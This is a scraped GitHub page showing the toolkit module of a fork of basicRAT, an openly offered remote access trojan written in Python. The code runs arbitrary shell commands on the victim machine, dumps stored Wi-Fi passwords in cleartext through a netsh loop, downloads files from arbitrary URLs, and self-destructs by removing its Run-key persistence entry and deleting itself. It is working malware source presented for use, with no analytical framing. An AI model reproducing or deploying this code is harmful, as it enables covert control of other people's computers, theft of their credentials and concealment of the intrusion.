Skip to content
This repository
Search
Pull requests
Issues
Marketplace
Explore
 @harshivara
 Sign out
1
0 223 dRl-l/basicRAT
forked from vesche/basicRAT
 Code  Pull requests 0  Projects 0  Wiki  Insights
basicRAT/core/toolkit.py
81282e3  on 27 Jun 2017
 cyankw Add Function: steal wifi password
    
113 lines (86 sloc)  2.58 KB
#
# basicRAT toolkit module
# https://github.com/vesche/basicRAT
#

import datetime
import os
import subprocess
import sys
import urllib
import zipfile


def cat(f, plat):
    if os.path.isfile(f):
        if plat == 'win':
            return execute('type {}'.format(f))
        else:
            return execute('cat {}'.format(f))
    else:
        return 'Error: File not found.'


def execute(command):
    output = subprocess.Popen(command, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()


def stealwifi(plat):
    if plat == 'win':
        steal = r"""for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear"""
        return execute(steal)
    elif plat == 'nix':
        pass

    elif plat == 'mac':
        pass

def ls(path, plat):
    if not path:
        path = '.'
    
    if os.path.exists(path):
        if plat == 'win':
            return execute('dir {}'.format(path))
        else:
            return execute('ls {}'.format(path))
    else:
        return 'Error: Path not found.'


def pwd(plat):
    if plat == 'win':
        return execute('cd')
    else:
        return execute('pwd')


def selfdestruct(plat):
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU

        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass

    elif plat == 'nix':
        pass

    elif plat == 'mac':
        pass

    # self delete basicRAT
    os.remove(sys.argv[0])
    sys.exit(0)


def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'


def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'

    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)

    try:
        urllib.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'

    return 'File {} downloaded.'.format(fname)
